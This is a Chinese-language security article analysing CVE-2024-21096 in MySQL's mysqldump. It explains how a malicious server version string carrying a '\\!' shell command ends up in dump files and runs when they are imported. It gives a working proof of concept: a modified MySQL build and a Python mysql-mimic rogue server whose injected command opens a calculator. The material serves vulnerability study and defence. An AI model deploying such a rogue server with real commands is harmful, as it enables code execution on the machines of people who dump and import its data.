---
title: CVE-2024-21096：MySQLDump提权漏洞分析
url: https://www.freebuf.com/vuls/411090.html
source: FreeBuf网络安全行业门户
date: 2024-09-15
fetch_date: 2025-10-06T18:26:00.373690
---

# CVE-2024-21096：MySQLDump提权漏洞分析

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

CVE-2024-21096：MySQLDump提权漏洞分析

* ![]()
* 关注

* [漏洞](https://www.freebuf.com/articles/vuls)

CVE-2024-21096：MySQLDump提权漏洞分析

2024-09-14 17:28:17

CVE-2024-21096是一个中等严重性的漏洞，它影响Oracle MySQL Server产品中的mysqldump组件。成功利用此漏洞的未认证攻击者可能对MySQL Server的数据进行未授权的更新、插入或删除操作，还可以读取MySQL Server可访问数据的一部分，并可能导致MySQL Server部分拒绝服务（partial DOS）。利用该漏洞的攻击需要在MySQL Server的本地进行，因此利用条件有限，利用复杂性也较高，该漏洞主要影响8.0.0版本至8.0.36版本之间的MySQL Server。

## **漏洞原理**

mysqldump是MySQL的一个组件，可以用于将 MySQL 数据库的数据和结构导出到一个文本文件中，该文件通常是 SQL 格式。这个文件随后可以被用来备份数据库、迁移数据或在另一个 MySQL 服务器上重建数据库。

比如用mysqldump导出MySQL数据库中的某个数据库，可以在MySQL Server本地用以下命令：

```
mysqldump -u username -p database_name &ampgt dumpfile.sql
```

其中username是用户名，database\_name是待导出的数据库名称，导出之后得到dumpfile.sql文件。

导出后的SQL文件可以使用mysql命令执行导入操作，比如：

```
mysql -u username -p database_name &amplt /path/to/dumpfile.sql
```

导出和导入的操作可以理解为将数据库按照SQL语句解析导出为文件，再逐一执行SQL语句文件构建新的数据库。

问题在于，mysqldump在接收MySQL Server的信息时候没有对数据库版本等元信息（meta command）进行净化处理，攻击者可以构造恶意的元信息通过mysqldump导出，并在SQL文件导入的时候执行恶意代码。

这点可以查看2024年2月22日漏洞修复的代码变更情况获知：

![](https://image.3001.net/images/20240914/1726305520_66e554f0a678421813fab.png!small)

在之前的版本（8.0.36）中，可以看到mysqldump在处理MySQL版本信息时只是通过mysql\_get\_server\_info(&mysql\_connection)获得版本信息并输出，而漏洞补丁中去除了这段代码，增加了get\_safe\_server\_info函数，该函数中做了两个主要的变更：

1. 通过SERVER\_VERSION\_LENGTH宏定义的60个字符限制版本信息的长度；
2. 检查版本信息中是否存在非法字符（非字符或标点服务），如果存在则抛弃非法字符并返回版本信息。

另外，在补丁中还可以看到为了测试补丁用到的测试攻击版本信息，即DBUG\_EXECUTE\_IF部分中的：

```
8.0.0-injection_test\n\\! touch /tmp/xxx
```

## **漏洞利用**

根据以上的漏洞原理，可知利用点是在MySQL的服务版本信息中，在服务版本信息中注入恶意代码之后，包含服务版本信息的SQL文件被MySQL执行后，便可以执行恶意代码。由于mysqldump和mysql命令联合执行或通过SQL文件执行的概率不高，因此CVE-2024-21096漏洞的CVSS评分不高，仅有4.9分，其中可利用性分数只有1.4分。

但漏洞的利用难点在于MySQL的版本信息是一个只读变量，是无法通过MySQL手动配置进行修改的，唯一的办法是通过源代码编译构建MySQL版本，在源代码中修改MySQL的版本信息，修改/include/mysql\_version.h文件中的MYSQL\_SERVER\_VERSION宏定义，比如：

![1726305638_66e555664305ec2262dd9.png!small](https://image.3001.net/images/20240914/1726305638_66e555664305ec2262dd9.png!small)

笔者以8.0.34版本为例，通过手动修改版本信息，并编译MySQL，编译过程如下：

```
sudo apt-get updatesudo apt-get install build-essential cmake libncurses5-dev bison libssl-dev pkg-config wget https://dev.mysql.com/get/Downloads/MySQL-8.0/mysql-8.0.34.tar.gztar xzvf mysql-8.0.34.tar.gzcd mysql-8.0.34 mkdir buildcd buildcmake .. -DDOWNLOAD_BOOST=1 -DWITH_BOOST=.. makesudo make install
```

上述命令执行完毕后，MySQL即编译安装完成，接下来是初始化MySQL数据库：

```
sudo /usr/local/mysql/bin/mysqld --initialize --user=mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data
```

初始化期间会随机生成MySQL的root账户口令，重置口令之后通过show variables查看服务版本即可发现版本信息是修改后的内容：

![1726305659_66e5557b8cb8e01684f9d.png!small](https://image.3001.net/images/20240914/1726305659_66e5557b8cb8e01684f9d.png!small)

假设受害者通过mysqldump连接上面修改版本信息之后的攻击机：

```
mysqldump -h 192.168.2.217 -urepoog -p mysql
```

执行上述命令后即可看到版本信息是修改之后的内容：

![1726305677_66e5558dc838802564a63.png!small](https://image.3001.net/images/20240914/1726305677_66e5558dc838802564a63.png!small)

在执行数据库导出和导入操作之后，版本信息中的命令就会得到执行，比如下面的命令：

```
mysqldump -h 192.168.2.217 -urepoog -p pwndb | msyql -h 192.168.2.217 -urepoog -p pwndb_imp
```

![1726305695_66e5559f6fa0fb796571d.png!small](https://image.3001.net/images/20240914/1726305695_66e5559f6fa0fb796571d.png!small)

当然，除了手动编译MySQL之外，也可以使用高交互的MySQL蜜罐项目进行更简单的配置和修改，比如使用mysql-mimic项目，该项目是用 Python编写的轻量级项目，它旨在模拟MySQL数据库的行为，它可以在不实际运行MySQL数据库的情况下，模拟MySQL的协议和行为，常用来做无MySQL实际环境下MySQL测试。

在蜜罐机上基于mysql-mimic库编写和运行以下代码，该代码中设置了MySQL的服务版本信息：

```
import loggingimport asynciofrom sqlglot.executor import execute from mysql_mimic import MysqlServer, Sessionfrom mysql_mimic.variables import GlobalVariables  SCHEMA = {    &ampquottest&ampquot: {        &ampquotx&ampquot: {            &ampquota&ampquot: &ampquotINT&ampquot,        }    }} TABLES = {    &ampquottest&ampquot: {        &ampquotx&ampquot: [            {&ampquota&ampquot: 1},            {&ampquota&ampquot: 2},            {&ampquota&ampquot: 3},        ]    }} class MyVariables(GlobalVariables):    def __init__(self):        super().__init__()        self.set(&ampquotversion&ampquot, &ampquot8.0.0-injection-test\n\\! gnome-calculator&ampquot, True) class MySession(Session):    def __init__(self):        super().__init__()        self.variables = MyVariables()        self._functions[&ampquotVERSION&ampquot] = &ampquot8.1.1&ampquot     async def query(self, expression, sql, attrs):        result = execute(expression, schema=SCHEMA, tables=TABLES)        return result.rows, result.columns     async def schema(self):        return SCHEMA  async def main():    logging.basicConfig(level=logging.DEBUG)    server = MysqlServer(session_factory=MySession)    await server.serve_forever()  if __name__ == &ampquot__main__&ampquot:    asyncio.run(main())
```

上述程序中设计的服务版本信息是8.0.0-injection-test\n\\! gnome-calculator，蜜罐机的IP地址是172.23.189.209，攻击者（也是受害者）如果通过资产探测扫描到MySQL蜜罐，并通过mysqldump企图做数据库导出和导入，则会出现下图中的效果（弹出计算器）。

![1726305695_66e5559f918b65dfcc2bb.png!small](https://image.3001.net/images/20240914/1726305695_66e5559f918b65dfcc2bb.png!small)

这个漏洞的利用条件非常有限，修复方法也非常简单，只需要升级最新版本的MySQL即可。

## **参考资料**

https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Alexander%20Rubin%20Martin%20Rakhmanov%20-%20Atomic%20Honeypot%20A%20MySQL%20Honeypot%20That%20Drops%20Shells.pdf

# 漏洞 # web安全 # 系统安全 # 数据安全 # 漏洞分析

本文为 独立观点，未经授权禁止转载。
如需授权、对文章有疑问或需删除稿件，请联系 FreeBuf
客服小蜜蜂（微信：freebee1024）

被以下专辑收录，发现更多精彩内容

+ 收入我的专辑

+ 加入我的收藏

展开更多

相关推荐

![]()

关 注

* 0 文章数
* 0 关注者

文章目录

漏洞原理

漏洞利用

参考资料

![](/images/logo_b.png)

本站由阿里云 提供计算与安全服务

### 用户服务

* [有奖投稿](https://www.freebuf.com/write)
* [提交漏洞](https://www.vulbox.com/bounties/detail-72)
* [参与众测](https://www.vulbox.com/projects/list)
* [商城](https://shop.freebuf.com)

### 企业服务

* [安全咨询](https://company.freebuf.com)
* [产业全景图](https://www.freebuf.com/news/307349.html)
* [企业SRC](https://www.vulbox.com/service/src)
* [安全众测](https://www.vulbox.com/)

### 合作信息

* [斗象官网](https://www.tophant.com/)
* [广告投放](https://www.freebuf.com/articles/444331.html)
* [联系我们](https://www.freebuf.com/articles/444332.html)

### 关于我们

* [关于我们](https://www.freebuf.com/news/others/864.html)
* 微信公众号
* [新浪微博](http://weibo.com/freebuf)

### 战略伙伴

* [![](https://image.3001.net/images/20191017/1571306518_5da83c1686dd9.png)](http://www.aliyun.com/?freebuf)

### FreeBuf知识大陆

![](https://image.3001.net/images/20250703/1751535036_68664dbcae34ac40bb9e7.png)

扫码把安全装进口袋

* [斗象科技](https://www.tophant.com/)
* [FreeBuf](https://www.freebuf.com)
* [漏洞盒子](https://www.vulbox.com/)
* [斗象智能安全](https://ai.tophant.com/)
* [免责条款](https://www.freebuf.com/dis)
* [协议条款](https://my.freebuf.com/AgreeProtocol/duty)

Copyright © 2025 WWW.FREEBUF.COM All Rights Reserved
[沪ICP备2024099014号](https://beian.miit.gov.cn/#/Integrated/index) | [沪公安网备
![](https://image.3001.net/images/20200106/1578291342_5e12d08ec2379.png)](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=31011502009321)